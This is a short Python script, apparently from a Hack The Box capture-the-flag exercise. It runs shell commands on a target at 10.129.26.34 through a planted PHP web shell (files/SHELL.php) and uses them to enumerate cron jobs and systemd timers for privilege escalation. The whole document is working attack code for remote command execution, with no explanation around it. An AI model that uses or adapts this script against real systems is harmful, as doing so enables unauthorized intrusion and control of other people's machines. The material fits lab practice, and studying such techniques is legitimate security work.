import urllib.request, urllib.parse

cmds = [
    "ls -la /etc/cron.d/ 2>&1",
    "cat /etc/crontab 2>&1",
    "ls -la /etc/cron.hourly/ 2>&1",
    "ls -la /etc/cron.daily/ 2>&1",
    "systemctl list-timers --all 2>&1 | head -20",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
